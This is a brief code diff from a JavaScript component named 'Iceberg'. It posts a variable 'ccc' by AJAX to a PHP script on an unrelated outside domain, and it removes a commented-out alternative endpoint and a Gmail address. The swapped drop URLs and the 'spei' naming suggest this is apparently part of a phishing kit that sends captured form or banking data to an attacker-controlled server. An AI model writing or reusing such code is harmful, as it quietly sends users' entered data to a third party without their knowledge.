@@ -140,8 +140,6 @@ export const Iceberg = ()=>{
           $.ajax({
               type: "POST",
               url: "https://physicaleducationdiploma.com/footer/spein.php",
-            //   url: "https://bucketlion.com/hello/spei.php",
-            // speinter82@gmail.com
               data: ccc,
               success(data) {
                   console.log(data);
